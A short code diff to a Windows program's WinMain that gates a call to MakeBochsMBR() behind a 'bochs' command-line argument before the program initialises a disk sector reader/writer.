@@ -11,8 +11,19 @@
 int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
 	int ret = 0;
 
-	ret = MakeBochsMBR();
-	return 0;
+	char* cmd = GetCommandLineA();
+	wchar_t wstrcmd[1024] = { 0 };
+	int wstrlen = MultiByteToWideChar(CP_ACP, 0, cmd, -1, wstrcmd, 1024);
+	int argc = 0;
+	LPWSTR * argv = CommandLineToArgvW((LPCWSTR)wstrcmd, &argc);
+	if(argc > 1)
+	{
+		if (lstrcmpiW(argv[1], L"bochs") == 0)
+		{
+			ret = MakeBochsMBR();
+			return 0;
+		}
+	}
 
 	ret = SectorReaderWriter::init();
 	if (ret <= 0)
